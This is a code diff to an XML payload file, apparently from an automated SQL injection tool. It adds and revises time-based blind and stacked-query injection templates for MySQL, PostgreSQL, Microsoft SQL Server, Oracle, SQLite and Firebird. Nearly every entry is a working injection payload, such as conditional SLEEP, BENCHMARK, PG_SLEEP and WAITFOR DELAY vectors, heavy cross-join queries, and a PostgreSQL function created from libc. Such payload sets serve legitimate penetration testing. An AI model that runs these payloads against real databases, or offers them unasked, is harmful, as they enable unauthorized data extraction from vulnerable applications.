@@ -161,7 +161,7 @@ Tag: <test>
             SQL injections.
 
         Sub-tag: <out-of-band>
-            #TODO
+            # TODO
 
     Sub-tag: <details>
         Which details can be infered if the payload succeed.
@@ -172,7 +172,7 @@ Tag: <test>
         Sub-tags: <dbms_version>
             What is the database management system version (e.g. 5.0.51).
 
-        Sub-tags:  <os>
+        Sub-tags: <os>
             What is the database management system underlying operating
             system.
 
@@ -1206,6 +1206,7 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector>; IF(([INFERENCE]), SLEEP([SLEEPTIME]), [RANDNUM]);</vector>
         <request>
             <payload>; SELECT SLEEP([SLEEPTIME]);</payload>
             <comment>#</comment>
@@ -1226,6 +1227,7 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector>; IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM]);</vector>
         <request>
             <payload>; SELECT BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'));</payload>
             <comment>#</comment>
@@ -1245,6 +1247,7 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END);</vector>
         <request>
             <payload>; SELECT PG_SLEEP([SLEEPTIME]);</payload>
             <comment>--</comment>
@@ -1259,14 +1262,15 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL &lt; 8.2 stacked queries (heavy query)</title>
+        <title>PostgreSQL stacked queries (heavy query)</title>
         <stype>4</stype>
-        <level>3</level>
+        <level>2</level>
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END);</vector>
         <request>
-            <payload>; SELECT [RANDNUM] WHERE EXISTS(SELECT * FROM GENERATE_SERIES(1, [SLEEPTIME]000000));</payload>
+            <payload>; SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000);</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -1274,7 +1278,6 @@ Formats:
         </response>
         <details>
             <dbms>PostgreSQL</dbms>
-            <dbms_version>&lt; 8.2</dbms_version>
         </details>
     </test>
 
@@ -1285,8 +1288,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END);</vector>
         <request>
-            <payload>; CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME]);</payload>
+            <payload>; CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6', 'sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME]);</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -1306,6 +1310,7 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector></vector>
         <request>
             <payload>; WAITFOR DELAY '0:0:[SLEEPTIME]';</payload>
             <comment>--</comment>
@@ -1325,6 +1330,7 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector></vector>
         <request>
             <payload>; BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END;</payload>
             <comment>--</comment>
@@ -1344,6 +1350,7 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector></vector>
         <request>
             <payload>; EXEC DBMS_LOCK.SLEEP([SLEEPTIME].00);</payload>
             <comment>--</comment>
@@ -1363,6 +1370,7 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector></vector>
         <request>
             <payload>; EXEC USER_LOCK.SLEEP([SLEEPTIME].00);</payload>
             <comment>--</comment>
@@ -1382,6 +1390,7 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector></vector>
         <request>
             <payload>; SELECT LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))));</payload>
             <comment>--</comment>
@@ -1402,8 +1411,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
+        <vector></vector>
         <request>
-            <payload>; SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6;</payload>
+            <payload>; SELECT [RANDNUM] FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6;</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -1448,7 +1458,7 @@ Formats:
         <where>1</where>
         <vector>AND [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM])</vector>
         <request>
-            <payload>AND BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
+            <payload>AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1459,15 +1469,35 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL AND time-based blind (heavy query)</title>
+        <title>PostgreSQL &gt; 8.1 AND time-based blind</title>
         <stype>5</stype>
-        <level>1</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000))</payload>
+            <payload>AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1484,9 +1514,9 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7) ELSE [RANDNUM] END)</vector>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7)</payload>
+            <payload>AND [RANDNUM]=(SELECT [RANDNUM] FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1522,9 +1552,9 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) ELSE [RANDNUM] END)</vector>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)</payload>
+            <payload>AND [RANDNUM]=(SELECT [RANDNUM] FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1561,9 +1591,9 @@ Formats:
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6),[RANDNUM])</vector>
+        <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT [RANDNUM] FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6),[RANDNUM])</vector>
         <request>
-            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6)</payload>
+            <payload>AND [RANDNUM]=(SELECT [RANDNUM] FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1585,10 +1615,9 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
-        <!-- NOTE: =0 needs to stay or else MySQL goes nunners -->
-        <vector>OR IF(([INFERENCE]), SLEEP([SLEEPTIME]), [RANDNUM])=0</vector>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]), SLEEP([SLEEPTIME]), [RANDNUM])</vector>
         <request>
-            <payload>OR SLEEP([SLEEPTIME])=0</payload>
+            <payload>OR [RANDNUM]=SLEEP([SLEEPTIME])</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -1602,13 +1631,13 @@ Formats:
     <test>
         <title>MySQL &lt; 5.0.12 OR time-based blind (heavy query)</title>
         <stype>5</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
         <vector>OR [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM])</vector>
         <request>
-            <payload>OR BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
+            <payload>OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1619,15 +1648,35 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL OR time-based blind (heavy query)</title>
+        <title>PostgreSQL &gt; 8.1 OR time-based blind</title>
         <stype>5</stype>
         <level>3</level>
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000))</payload>
+            <payload>OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT [RANDNUM] FROM GENERATE_SERIES(1, [SLEEPTIME]000000))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1644,9 +1693,9 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7) ELSE [RANDNUM] END)</vector>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7)</payload>
+            <payload>OR [RANDNUM]=(SELECT [RANDNUM] FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1682,9 +1731,9 @@ Formats:
         <risk>4</risk>
         <clause>1,2,3</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) ELSE [RANDNUM] END)</vector>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)</payload>
+            <payload>OR [RANDNUM]=(SELECT [RANDNUM] FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1721,9 +1770,9 @@ Formats:
         <risk>3</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6),[RANDNUM])</vector>
+        <vector>OR [RANDNUM]=IIF(([INFERENCE]),(SELECT [RANDNUM] FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6),[RANDNUM])</vector>
         <request>
-            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6)</payload>
+            <payload>OR [RANDNUM]=(SELECT [RANDNUM] FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
